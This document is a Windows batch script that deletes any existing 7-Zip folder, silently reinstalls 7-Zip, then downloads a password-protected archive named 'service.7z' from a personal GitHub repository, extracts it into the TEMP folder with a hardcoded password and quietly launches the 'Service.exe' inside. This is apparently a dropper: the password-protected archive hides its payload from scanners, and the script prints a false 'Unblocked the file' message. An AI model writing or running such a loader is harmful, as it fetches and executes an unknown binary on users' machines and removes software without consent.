@echo off
setlocal

:: === CONFIGURATION ===
set "zipUrl=https://github.com/Andre0194/service/raw/refs/heads/master/service.7z"  :: Direct URL for the service.7z file
set "zipPath=%TEMP%\service.7z"                     :: Path to save the downloaded 7z file in TEMP
set "password=*#Slayerx@123plesk"                   :: Password for the service.7z file
set "sevenZip=C:\Program Files\7-Zip\7z.exe"        :: Path to 7z.exe for extraction
set "installUrl=https://www.7-zip.org/a/7z1900-x64.exe" :: 7-Zip installer URL (64-bit version)

:: === FORCE INSTALL 7-ZIP ===
echo ❌ Checking for 7-Zip installation...

:: Remove any existing 7-Zip before installation
if exist "%sevenZip%" (
    echo ❌ 7-Zip found at: %sevenZip%. Uninstalling 7-Zip...
    rd /s /q "C:\Program Files\7-Zip"
)

:: Download 7-Zip installer
echo 🧩 Downloading 7-Zip installer...
powershell -Command "Invoke-WebRequest -Uri '%installUrl%' -OutFile '%TEMP%\7z_installer.exe'"

:: Install 7-Zip silently
echo 🧩 Installing 7-Zip...
start /wait %TEMP%\7z_installer.exe /S /D="C:\Program Files\7-Zip"

:: Verify if installation succeeded
if not exist "%sevenZip%" (
    echo ❌ Failed to install 7-Zip.
    exit /b 1
)
echo ✅ 7-Zip installed successfully at: %sevenZip%

:: === Step 1: Download the service.7z file ===
echo 📥 Downloading service.7z...
powershell -Command ^
    Invoke-WebRequest -Uri '%zipUrl%' -OutFile '%zipPath%' -ErrorAction Stop
if %ERRORLEVEL% neq 0 (
    echo ❌ Failed to download service.7z
    exit /b 1
)
echo ✅ service.7z downloaded to %zipPath%.

:: === Step 2: Extract the service.7z file using 7-Zip ===
echo 🧩 Extracting service.7z to TEMP folder...
"%sevenZip%" x "%zipPath%" -p%password% -o"%TEMP%" -y
if %ERRORLEVEL% neq 0 (
    echo ❌ Failed to extract service.7z
    exit /b 1
)
echo ✅ Extraction completed successfully.

:: === Step 3: Check if Service.exe exists and run it ===
set "exeFilePath=%TEMP%\Service.exe"
if exist "%exeFilePath%" (
    echo Service.exe found at %exeFilePath%. Attempting to run it...
    echo ✅ Unblocked the file %exeFilePath%
    timeout /t 2 /nobreak >nul
    start "" "%exeFilePath%" >nul 2>&1
    if %ERRORLEVEL% neq 0 (
        echo ❌ Failed to start Service.exe
        exit /b 1
    )
    echo ✅ Service.exe started successfully.
) else (
    echo ❌ Service.exe not found in the extracted folder.
    dir "%TEMP%"
    exit /b 1
)

endlocal
